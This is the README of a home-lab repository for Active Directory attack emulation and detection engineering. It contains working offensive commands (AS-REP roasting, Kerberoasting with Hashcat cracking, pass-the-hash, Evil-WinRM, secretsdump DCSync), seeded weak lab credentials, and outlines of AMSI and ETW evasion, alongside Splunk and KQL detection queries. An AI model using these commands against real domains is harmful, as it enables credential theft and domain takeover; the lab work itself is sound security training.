# 🛡️ Enterprise Active Directory Security & Threat Detection Lab

<div align="center">

[![Platform](https://img.shields.io/badge/Platform-Windows%20Server%20%7C%20Windows%2011%20%7C%20Kali-blue?style=for-the-badge&logo=windows)](https://github.com/AtharvaShastrakar/Active-Directory-Security-Threat-Detection-Lab)
[![Architecture](https://img.shields.io/badge/Architecture-ARM64%20(Apple%20Silicon)%20%7C%20x86__64-orange?style=for-the-badge&logo=apple)](https://github.com/AtharvaShastrakar/Active-Directory-Security-Threat-Detection-Lab)
[![PowerShell](https://img.shields.io/badge/Automation-PowerShell%205.1+-5391FE?style=for-the-badge&logo=powershell&logoColor=white)](https://github.com/AtharvaShastrakar/Active-Directory-Security-Threat-Detection-Lab)
[![Sysmon](https://img.shields.io/badge/Telemetry-Sysmon%20v15+-red?style=for-the-badge&logo=microsoft)](https://github.com/AtharvaShastrakar/Active-Directory-Security-Threat-Detection-Lab)
[![MITRE ATT&CK](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-critical?style=for-the-badge&logo=matrix)](https://attack.mitre.org/)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

**An enterprise-grade, fully reproducible multi-VM Active Directory laboratory engineered for adversary emulation, lateral movement research, EDR evasion mechanics, and forensic threat detection.**

[Architecture](#-architecture--network-topology) •
[Quickstart](#-step-by-step-deployment-guide) •
[MITRE ATT&CK](#-mitre-attck-matrix-mapping) •
[Red Team Playbook](redteam/lateral_movement_playbook.md) •
[Detection Guide](detection/detection_engineering_guide.md) •
[EDR Internals](redteam/edr_evasion_techniques.md)

</div>

---

## 📌 Executive Summary

Modern cyber defense demands deep technical insight into how threat actors navigate corporate Active Directory (AD) environments. This repository provides an end-to-end, automated, infrastructure-as-code lab environment that mirrors a realistic corporate domain (`adlab.test`).

Designed to run seamlessly within a **16 GB RAM budget** on both **Apple Silicon (M-Series via UTM / VMware Fusion)** and **Intel/AMD PCs (via VirtualBox / VMware Workstation)**, this lab pairs aggressive **Red Team adversary emulation** with granular **Blue Team telemetry collection** and **detection engineering** rules.

### Target Audiences & Use Cases
- **Detection Engineers & SOC Analysts**: Validate detection fidelity, test custom Sysmon rules, and tune SIEM queries (Splunk / Elastic) against live attack traffic.
- **Penetration Testers & Red Teamers**: Practice stealthy Kerberos credential attacks, token abuse, NTLM relaying/Pass-the-Hash, and EDR bypass methods in an isolated sandbox.
- **Security Researchers**: Analyze Windows internal mechanisms, user-mode API hooking (`ntdll.dll`), AMSI/ETW memory patching, and direct syscall execution.

---

## 🏗️ Architecture & Network Topology

The lab features an air-gapped, isolated virtual network (`192.168.56.0/24`) with strict segmentation to prevent accidental exposure while simulating realistic corporate attack vectors.

```
+-----------------------------------------------------------------------------------------------+
|                                         HOST MACHINE                                          |
|  - Apple Silicon (M1/M2/M3/M4, 16 GB RAM) or x86_64 Workstation                               |
|  - Virtualization Hypervisor: UTM / VMware Fusion Pro / Oracle VirtualBox                     |
+───────────────────────────────────────────────┬───────────────────────────────────────────────+
                                                │
                                                ▼
+-----------------------------------------------------------------------------------------------+
|                        ISOLATED INTERNAL NETWORK SUBNET: 192.168.56.0/24                      |
|  - VirtualBox: "Internal Network" (e.g., ad-lab-net)                                          |
|  - UTM: "Host Only" or "Isolated VLAN"                                                        |
|  - Zero internet bridge (Air-gapped adversary emulation & forensic safety)                    |
+───────────────┬───────────────────────────────┬───────────────────────────────┬───────────────+
                │                               │                               │               │
                ▼                               ▼                               ▼               ▼
+───────────────────────────────+ +───────────────────────────+ +───────────────────────────+ +───────────────────────────────+
|             DC01              | |         CLIENT01          | |         CLIENT02          | |         KALI-LINUX          |
| 192.168.56.10 /24             | | 192.168.56.20 /24         | | 192.168.56.21 /24         | | 192.168.56.50 /24             |
|                               | |                           | |                           | |                               |
| • Windows Server 2022/2025    | | • Windows 10/11 Pro       | | • Windows 10/11 Pro       | | • Kali Linux 2024+ (ARM64/x64)|
| • Domain Forest: adlab.test   | | • Domain Member           | | • Domain Member           | | • Impacket, NetExec, BloodHound|
| • AD DS, Kerberos KDC, DNS    | | • Workstation (Initial)   | | • Lateral Movement Pivot  | | • Evil-WinRM, Hashcat         |
| • Sysmon + Process Auditing   | | • Sysmon + Script Logging | | • Sysmon + Script Logging | | • Telemetry / SIEM Collector  |
+───────────────────────────────+ +───────────────────────────+ +───────────────────────────+ +───────────────────────────────+
```

### Detailed Network & Node Matrix

| Node | Operating System | Domain FQDN | IP Address | Primary Roles & Services |
| :--- | :--- | :--- | :--- | :--- |
| **DC01** | Windows Server 2022 / 2025 | `dc01.adlab.test` | `192.168.56.10` | AD DS, DNS Server (`127.0.0.1`), Kerberos KDC, SMB Shares |
| **CLIENT01** | Windows 10 / 11 Enterprise | `client01.adlab.test` | `192.168.56.20` | Workstation, Initial Beachhead, Finance OU Endpoint |
| **CLIENT02** | Windows 10 / 11 Enterprise | `client02.adlab.test` | `192.168.56.21` | Secondary Workstation, Lateral Pivot Target, Tier-1 Admin Target |
| **KALI** | Kali Linux ARM64 / amd64 | `kali.adlab.test` (local) | `192.168.56.50` | Attacker Machine, Offensive Toolchain & SIEM Relay |

---

## 📊 Resource Allocation (16 GB Host RAM Budget)

To guarantee flawless execution on a standard **16 GB RAM host** without causing macOS or Windows host paging:

| Virtual Machine | Recommended vCPUs | RAM Allocation | Virtual Disk | Operational Note |
| :--- | :---: | :---: | :---: | :--- |
| **DC01 (Domain Controller)** | 2 vCPUs | **3.5 GB - 4.0 GB** | 40 GB NVMe/SATA | Core identity infrastructure; keep running at all times. |
| **CLIENT01 (Primary Client)** | 2 vCPUs | **3.5 GB - 4.0 GB** | 40 GB NVMe/SATA | Primary endpoint for initial compromise and telemetry collection. |
| **CLIENT02 (Lateral Client)** | 2 vCPUs | **3.0 GB** | 35 GB NVMe/SATA | *On-Demand Staging*: Boot when testing multi-hop lateral movement. |
| **KALI (Attacker VM)** | 2 vCPUs | **2.5 GB - 3.0 GB** | 30 GB Virtual Disk | Headless or XFCE desktop; low memory footprint. |
| **Host Operating System** | System | **3.0 GB - 3.5 GB** | - | Reserved for macOS/Windows host system responsiveness. |

> [!TIP]
> **Host Memory Optimization (16 GB Sweet Spot)**: Keep `CLIENT02` shut down during Phase 1 & Phase 2 (Reconnaissance and Initial Roasting). Boot `CLIENT02` exclusively during Phase 3 (Pass-the-Hash / WinRM lateral movement).

---

## ⚡ Key Features & Engineering Highlights

```
+───────────────────────────────────────────────────────────────────────────────────────────────+
|                                      LAB CAPABILITIES                                         |
+───────────────────────────────────────────────┬───────────────────────────────────────────────+
| ⚔️  RED TEAM & ADVERSARY EMULATION            | 🛡️  BLUE TEAM & DETECTION ENGINEERING         |
| • AS-REP Roasting (No Pre-Auth)               | • Custom Sysmon XML Configuration             |
| • Kerberoasting with Weak Service SPNs        | • Enhanced Command Line Process Auditing      |
| • Pass-the-Hash (WMI / DCOM)                  | • PowerShell Deep Script Block Logging (4104) |
| • PsExec Service Injection & Named Pipes      | • Kerberos Ticket Request Auditing (4768/4769)|
| • Remote WinRM / PowerShell Remoting          | • Splunk SPL & Elastic KQL Correlation Rules  |
| • NTDS.dit Secrets Dumping (DRSUAPI/VSS)      | • Event Log Forensics & Parent-Child Trees    |
| • In-Memory AMSI & ETW Patching PoCs          | • Sub-second Attacker Action Telemetry Mapping|
+───────────────────────────────────────────────┴───────────────────────────────────────────────+
```

---

## 🗺️ MITRE ATT&CK Matrix Mapping

Every exercise in this laboratory directly correlates to documented MITRE ATT&CK enterprise tactics and sub-techniques:

| MITRE Tactic | Technique ID | Technique Name | Target / Vector | Windows Event / Sysmon ID | Detection Rule |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Reconnaissance** | [T1590](https://attack.mitre.org/techniques/T1590/) | Gather Victim Network Info | Nmap / NetExec / BloodHound | Event `4624`, Sysmon `3` | Network Connection Spike |
| **Credential Access** | [T1558.004](https://attack.mitre.org/techniques/T1558/004/) | AS-REP Roasting | `svc_backup` (Pre-Auth Disabled) | **Event `4768`** (`PreAuthType = 0`) | [AS-REP Query](detection/detection_engineering_guide.md#detection-2-as-rep-roasting-no-pre-authentication) |
| **Credential Access** | [T1558.003](https://attack.mitre.org/techniques/T1558/003/) | Kerberoasting | `svc_sql` (`MSSQLSvc` SPN) | **Event `4769`** (`TicketEncryption = 0x17`) | [Kerberoast Query](detection/detection_engineering_guide.md#detection-1-kerberoasting-request-detection) |
| **Lateral Movement** | [T1550.002](https://attack.mitre.org/techniques/T1550/002/) | Pass-the-Hash | WMI / `wmiprvse.exe` | **Event `4624`** (Logon 3) + Sysmon `1` | [PtH Query](detection/detection_engineering_guide.md#detection-3-pass-the-hash-wmi-execution) |
| **Lateral Movement** | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | SMB / Windows Admin Shares | `impacket-psexec` | **Event `7045`**, Sysmon `17`, `18` | [PsExec Query](detection/detection_engineering_guide.md#detection-4-service-creation-lateral-movement-psexec) |
| **Lateral Movement** | [T1021.006](https://attack.mitre.org/techniques/T1021/006/) | Windows Remote Management | `evil-winrm` | **Event `4624`**, Sysmon `1` (`wsmprovhost`) | [WinRM Query](detection/detection_engineering_guide.md#detection-5-suspicious-winrm-remote-execution) |
| **Credential Access** | [T1003.003](https://attack.mitre.org/techniques/T1003/003/) | NTDS.dit Credential Dumping | `impacket-secretsdump` (DRSUAPI) | **Event `4662`**, Directory Replication | [SecretsDump Query](detection/detection_engineering_guide.md#detection-6-active-directory-dcsync--secretsdump) |
| **Defense Evasion** | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Impair Defenses: AMSI Patching | `amsi.dll!AmsiScanBuffer` | **Event `4104`**, Sysmon `10` | [AMSI Evasion Guide](redteam/edr_evasion_techniques.md#technique-1-in-memory-amsi-patching-amsiscanbuffer) |
| **Defense Evasion** | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Impair Defenses: ETW Blinding | `ntdll.dll!EtwEventWrite` | Process Memory Write / Sysmon `10` | [ETW Blinding Guide](redteam/edr_evasion_techniques.md#technique-2-in-memory-etw-blinding-etweventwrite) |

---

## 🔑 Pre-Seeded Identities & Target Credentials

The environment is seeded with realistic Active Directory objects, service accounts, and intentional security misconfigurations via [`scripts/02_populate_ad_environment.ps1`](scripts/02_populate_ad_environment.ps1):

| Account | Category / Role | Password / Secret | Security Misconfiguration / Attack Purpose |
| :--- | :--- | :--- | :--- |
| `ADLAB\Administrator` | Domain Admins | `P@ssw0rd2026!AD` | Full Domain Forest Control; Target for DRSUAPI DCSync. |
| `ADLAB\asmith` | Senior Financial Analyst | `Winter2026!Corporate` | Standard user for initial domain enumeration & BloodHound ingestion. |
| `ADLAB\jdoe` | Sales Representative | `Winter2026!Corporate` | Standard corporate user identity. |
| `ADLAB\bwayne` | Tier 1 Support Lead | `Winter2026!Corporate` | Member of `Tier1-Admins`; local admin rights on domain workstations. |
| `ADLAB\svc_sql` | Service Account | `Password123!` *(Weak)* | **Kerberoastable**: SPN `MSSQLSvc/dc01.adlab.test:1433` registered. |
| `ADLAB\svc_backup` | Service Account | `Password123!` *(Weak)* | **AS-REP Roasting Target**: `DoesNotRequirePreAuth = $True`. |

---

## 🚀 Step-by-Step Deployment Guide

```
+───────────────────────────────────────────────────────────────────────────────────────────+
|                                  LAB DEPLOYMENT PIPELINE                                  |
+───────────────────────────────────────────────────────────────────────────────────────────+
|  [Phase 1] Provision Hypervisor Network (192.168.56.0/24)                                  |
|     │                                                                                     |
|     ▼                                                                                     |
|  [Phase 2] Run 01_setup_dc.ps1 & 02_populate_ad_environment.ps1 on DC01                  |
|     │                                                                                     |
|     ▼                                                                                     |
|  [Phase 3] Run 03_client_setup.ps1 on CLIENT01 & CLIENT02 (Join Domain adlab.test)        |
|     │                                                                                     |
|     ▼                                                                                     |
|  [Phase 4] Run 04_configure_audit_policies.ps1 & 05_install_sysmon.ps1 on All Windows VMs |
|     │                                                                                     |
|     ▼                                                                                     |
|  [Phase 5] Run docs/verification_checklist.md & Snapshot All VMs Clean State              |
+───────────────────────────────────────────────────────────────────────────────────────────+
```

### Phase 1: Virtual Networking & Hypervisor Setup
1. **Hypervisor Selection**:
   - **Apple Silicon (M1/M2/M3/M4)**: Use **UTM** or **VMware Fusion Pro**.
   - **x86_64 PC (Intel/AMD)**: Use **Oracle VirtualBox 7.x** or **VMware Workstation Pro**.
2. **Configure Isolated Network**:
   - Subnet: `192.168.56.0/24`
   - Gateway/DHCP: Disabled (Static IP assignments used across all machines).
   - In VirtualBox: Set Adapter 1 to `Internal Network` (`ad-lab-net`).
   - In UTM: Set Network Mode to `Host Only` or isolated VLAN.

---

### Phase 2: Domain Controller Provisioning (`DC01`)
1. Deploy Windows Server (2022/2025). Set local Admin password to `P@ssw0rd2026!AD`.
2. Open PowerShell as Administrator and run [`scripts/01_setup_dc.ps1`](scripts/01_setup_dc.ps1):
   ```powershell
   Set-ExecutionPolicy Bypass -Scope Process -Force
   .\scripts\01_setup_dc.ps1
   ```
   *Configures static IP `192.168.56.10`, installs AD DS + DNS roles, promotes forest `adlab.test`, and restarts.*
3. After reboot, log in as `ADLAB\Administrator` and execute [`scripts/02_populate_ad_environment.ps1`](scripts/02_populate_ad_environment.ps1):
   ```powershell
   .\scripts\02_populate_ad_environment.ps1
   ```
   *Creates OUs, user accounts, groups, SPN `MSSQLSvc/dc01.adlab.test:1433`, disables pre-auth on `svc_backup`, and mounts `\\DC01\FinanceShare`.*

---

### Phase 3: Domain Member Enrollment (`CLIENT01` & `CLIENT02`)
1. On **CLIENT01**, launch PowerShell as Administrator and run [`scripts/03_client_setup.ps1`](scripts/03_client_setup.ps1):
   ```powershell
   .\scripts\03_client_setup.ps1 -ComputerName "CLIENT01" -ClientIP "192.168.56.20"
   ```
2. On **CLIENT02**, launch PowerShell as Administrator:
   ```powershell
   .\scripts\03_client_setup.ps1 -ComputerName "CLIENT02" -ClientIP "192.168.56.21"
   ```
3. Enter domain credentials (`ADLAB\Administrator`) when prompted. The machines will configure static DNS pointing to `192.168.56.10`, join `adlab.test`, and automatically reboot.

---

### Phase 4: Telemetry, Auditing & Sysmon Deployment
Execute these steps on **DC01**, **CLIENT01**, and **CLIENT02**:
1. Apply enhanced security audit policies via [`scripts/04_configure_audit_policies.ps1`](scripts/04_configure_audit_policies.ps1):
   ```powershell
   .\scripts\04_configure_audit_policies.ps1
   ```
   *Enables Process Creation Command Line logging (Event ID 4688), PowerShell Script Block Logging (Event ID 4104), and Kerberos Ticket Auditing.*
2. Install Sysmon using [`scripts/05_install_sysmon.ps1`](scripts/05_install_sysmon.ps1) with our tuned configuration [`configs/sysmonconfig.xml`](configs/sysmonconfig.xml):
   ```powershell
   .\scripts\05_install_sysmon.ps1
   ```
3. Verify the setup using the [Verification Checklist](docs/verification_checklist.md).
4. **📸 Take Hypervisor Snapshots** of all machines now! This allows instant restoration after attack simulations.

---

## ⚔️ Red Team Attack Simulation Playbook

The complete offensive execution guide is documented in [`redteam/lateral_movement_playbook.md`](redteam/lateral_movement_playbook.md). Here is a quick reference to the core attack paths:

### 1. Active Directory Reconnaissance & BloodHound
```bash
# Scan critical domain ports
nmap -sS -p 53,88,135,139,389,445,636,3268,3389,5985 192.168.56.10,20,21

# Enumerate domain info & null sessions with NetExec
nxc smb 192.168.56.10 -u '' -p '' --pass-pol

# Collect domain attack graph with BloodHound
bloodhound-python -u 'asmith' -p 'Winter2026!Corporate' -d 'adlab.test' -dc 'dc01.adlab.test' -ns '192.168.56.10' -c All --zip
```

### 2. AS-REP Roasting (`svc_backup`)
```bash
# Harvest AS-REP ticket without credentials
impacket-GetNPUsers 'adlab.test/svc_backup' -no-pass -format hashcat -outputfile asrep_hash.txt -dc-ip 192.168.56.10

# Crack offline with Hashcat (Mode 18200)
hashcat -m 18200 -a 0 asrep_hash.txt /usr/share/wordlists/rockyou.txt
# Cracked password: Password123!
```

### 3. Kerberoasting (`svc_sql`)
```bash
# Request TGS ticket for SQL service principal
impacket-GetUserSPNs 'adlab.test/asmith:Winter2026!Corporate' -dc-ip 192.168.56.10 -request -outputfile kerberoast_hash.txt

# Crack offline with Hashcat (Mode 13100)
hashcat -m 13100 -a 0 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt
# Cracked password: Password123!
```

### 4. Pass-the-Hash & Lateral Movement
```bash
# Lateral movement via WMI (Port 135)
impacket-wmiexec -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.56.20 "whoami"

# Administrative remote shell via WinRM (Port 5985)
evil-winrm -i 192.168.56.20 -u 'bwayne' -p 'Winter2026!Corporate'

# Domain database dumping via DRSUAPI
impacket-secretsdump 'adlab.test/Administrator:P@ssw0rd2026!AD@192.168.56.10' -outputfile ntds_hashes
```

---

## 🛡️ Blue Team Detection Engineering & SIEM Rules

All detection logic, event ID cross-references, and SIEM correlation queries are detailed in [`detection/detection_engineering_guide.md`](detection/detection_engineering_guide.md).

### Sample Detection Query: Kerberoasting Request Detection

#### Splunk SPL:
```spl
index=windows EventCode=4769 ServiceName!="*$*" TicketEncryptionType="0x17" TicketOptions="0x40810000"
| stats count dc(ServiceName) as distinct_services by src_ip, TargetUserName
| where count > 2
```

#### Elastic KQL:
```kql
event.code: "4769" and not winlog.event_data.ServiceName: *\$ and winlog.event_data.TicketEncryptionType: "0x17" and winlog.event_data.TicketOptions: "0x40810000"
```

---

## 🧬 EDR Internals & Evasion Research

To understand how modern Endpoint Detection & Response (EDR) solutions monitor attacks—and how advanced adversaries evade them—refer to [`redteam/edr_evasion_techniques.md`](redteam/edr_evasion_techniques.md).

```
+───────────────────────────────────────────────────────────────────+
|                        USER MODE (Ring 3)                         |
|                                                                   |
|   Attacker / Malware (powershell.exe / custom loader)             |
|          │                                                        |
|          ▼                                                        |
|   Win32 Subsystem APIs (kernel32.dll, advapi32.dll)               |
|          │                                                        |
|          ▼                                                        |
|   ntdll.dll ──────────▶ [ EDR Injected Hook: JMP to edrhook.dll ] |
|          │                     │                                  |
|          │                     ▼ (Inspect Call Stack & Arguments) |
|          │               Blocked? ──▶ Terminate Process           |
|          ▼                                                        |
|   SYSCALL (NtAllocateVirtualMemory, NtCreateThreadEx)             |
+──────────────────────────────────┼────────────────────────────────+
|                                  ▼                                |
|                       KERNEL MODE (Ring 0)                        |
|                                                                   |
|   Kernel Executive / SSDT Dispatcher                              |
|   Kernel Callbacks (PsSetCreateProcessNotifyRoutine, ObRegister)  |
+───────────────────────────────────────────────────────────────────+
```

### Explored Evasion Topics:
1. **User-Mode Hooking Mechanics**: Why EDRs hook `ntdll.dll` and how trampolines intercept API execution.
2. **In-Memory AMSI Patching**: Patching `amsi.dll!AmsiScanBuffer` to return `AMSI_RESULT_CLEAN`.
3. **ETW Blinding**: Overwriting `ntdll.dll!EtwEventWrite` to disable telemetry emission in PowerShell.
4. **Direct Syscalls & DLL Unhooking**: Bypassing user-mode EDR hooks by reading fresh `ntdll.dll` headers directly from disk.

---

## 📁 Repository Structure

```
Active-Directory-Security-Threat-Detection-Lab/
├── README.md                                 # Main lab blueprint & documentation
├── configs/
│   └── sysmonconfig.xml                      # Production-tuned Sysmon telemetry ruleset
├── detection/
│   └── detection_engineering_guide.md        # Splunk SPL, Elastic KQL, and Event ID mappings
├── docs/
│   └── verification_checklist.md             # Multi-stage health checks & validation commands
├── redteam/
│   ├── lateral_movement_playbook.md          # Step-by-step Kali exploitation workflows
│   └── edr_evasion_techniques.md             # In-depth guide to AMSI/ETW bypasses & syscalls
└── scripts/
    ├── 01_setup_dc.ps1                       # Automated Domain Controller promotion & DNS
    ├── 02_populate_ad_environment.ps1        # Seeds OUs, simulated users, SPNs & vulnerabilities
    ├── 03_client_setup.ps1                   # Configures network & joins machines to adlab.test
    ├── 04_configure_audit_policies.ps1       # Enables command line, PowerShell & Kerberos auditing
    └── 05_install_sysmon.ps1                 # Automates Sysmon download & config installation
```

---

## 🔍 Verification & Health Checks

Before starting any red team exercise, run through the [Verification Checklist](docs/verification_checklist.md):

```powershell
# 1. On DC01: Check core AD DS services
Get-Service -Name NTDS, ADWS, DNS, KDC, Netlogon | Select-Object Name, Status

# 2. On CLIENT01/02: Verify domain secure channel
Test-ComputerSecureChannel -Verbose

# 3. On Windows Endpoints: Check Sysmon status
Get-Service -Name "Sysmon"
```

---

## 📄 License

This project is open-source and released under the [MIT License](LICENSE). Contributions, issues, and feature requests are welcome!
